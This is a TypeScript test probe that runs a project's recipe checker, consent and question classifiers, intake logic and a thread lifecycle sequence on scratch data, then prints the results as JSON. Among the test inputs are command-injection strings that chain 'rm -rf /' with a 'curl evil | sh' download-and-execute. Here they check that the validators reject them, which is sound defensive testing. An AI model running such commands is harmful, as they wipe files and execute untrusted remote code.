// Probe of scenes/sma_r06.py (region 6, conversation and intake): runs the REAL checks, facts, intake and phase code of THIS checkout (the
// commit under drill) on the scratch worlds of tests/sma/r06-world.ts (fake host, scratch database, stand-in tools) and prints what they saw as
// one JSON line. It judges nothing: the scene compares every value with the node card's expected result and prove()s it.
// No model, no hub write, nothing outside the machine.
import { execFileSync } from "node:child_process";
import {
  observeAccepted, observeAssembly, observeCancel, observeDedupe, observeDiscussion, observeFacts, observeHandOver, observeLive, observeMeasures, observePlanningYes,
  observeProposal, observeRecipes, observeSandbox, observeStop, observeStoredTurn, observeTurnStop,
} from "../../../tests/sma/r06-world";
import { checkRecipe, factKind, isWholeConsent } from "../../../src/rooms/tasks";
import { isMachineMessage } from "../../../src/rooms/phase/intake";
import { resolveSibling } from "../../../src/rooms/sma-map/siblings";

const out: Record<string, unknown> = {};
out.recipeWords = ["run tests", "sma green", "window", "run tests; rm -rf / && curl evil | sh"].map((text) => checkRecipe(text));
out.consent = ["  да! ", "Да, запускай", "да, но поменяй кнопку", "yes please"].map((text) => isWholeConsent(text));
out.kinds = ["почему упало", "сколько потратили токенов", "что было вчера", "на каком этапе фаза?", "что с задачами", "нарисуй схему модуля", "почему упало, сколько токенов ушло"].map((text) => factKind(text));
out.machine = [isMachineMessage("[Lane Pilot phase] Phase x"), isMachineMessage("rm -rf / && lane_pilot_dispatch_writer {}")];
out.storedTurn = await observeStoredTurn();
out.assembly = await observeAssembly();
out.facts = await observeFacts();
out.recipes = await observeRecipes();
out.dedupe = await observeDedupe();
out.measures = await observeMeasures();
out.sandbox = await observeSandbox();
out.stop = await observeStop();
out.turnStop = await observeTurnStop();
out.accepted = await observeAccepted();
out.live = observeLive();
out.discussion = await observeDiscussion();
out.cancel = await observeCancel();
out.handOver = await observeHandOver();
out.planningYes = await observePlanningYes();
out.proposal = await observeProposal();
// n533 (core sibling, LOCAL drill): the persisted lifecycle wrapper on a migrated disposable database — stop before the
// start, a late start, the settle — read back from the row after every transition. Source imports of the sibling PRIMARY
// checkout under vite-node (resolveSibling, as sma_r10_probe.ts does for telegram); no vitest runtime, no model, no hub,
// nothing of the deployed build is claimed. The scene compares the persisted fields and prove()s the node.
const core = resolveSibling("core");
if (core.root === null) {
  out.n533 = { absent: core.why };
} else {
  const coreRev = execFileSync("git", ["-C", core.root, "rev-parse", "--short", "HEAD"], { encoding: "utf8" }).trim();
  try {
    const { createMigratedConnection } = await import(`${core.root}/packages/db/src/testing.ts`);
    const { applyThreadLifecycleEventInTransaction, createThread, getThread } = await import(`${core.root}/packages/db/src/data/threads.ts`);
    const { createProject } = await import(`${core.root}/packages/db/src/data/projects.ts`);
    const { upsertHost } = await import(`${core.root}/packages/db/src/data/hosts.ts`);
    const { noopNotifier } = await import(`${core.root}/packages/db/src/notifier.ts`);
    const db = createMigratedConnection();
    try {
      const host = upsertHost(db, noopNotifier, { name: "n533-host" });
      const { project } = createProject(db, noopNotifier, { name: "n533", source: { type: "local_path", hostId: host.id, path: "/tmp/n533" } });
      const thread = createThread(db, noopNotifier, { projectId: project.id, providerId: "codex", status: "starting" });
      const apply = (event: { type: string }) =>
        db.transaction((tx: unknown) => applyThreadLifecycleEventInTransaction(tx, { event, threadId: thread.id }));
      const persisted = () => {
        const row = getThread(db, thread.id);
        return row ? { status: row.status, statusChangedAt: row.statusChangedAt, updatedAt: row.updatedAt } : null;
      };
      const steps: Record<string, unknown>[] = [];
      for (const type of ["stop.requested", "run.started", "stop.settled"]) {
        const outcome = apply({ type });
        steps.push({
          event: type,
          applied: outcome.applied,
          reason: outcome.applied ? null : outcome.reason,
          detail: outcome.applied ? null : outcome.detail,
          persisted: persisted(),
        });
        await new Promise<void>((resolve) => setTimeout(resolve, 15));
      }
      out.n533 = { coreRev, steps };
    } finally {
      db.$client.close();
    }
  } catch (cause) {
    out.n533 = { coreRev, threw: cause instanceof Error ? cause.message : String(cause) };
  }
}
process.stdout.write(`${JSON.stringify(out)}\n`);
process.exit(0);
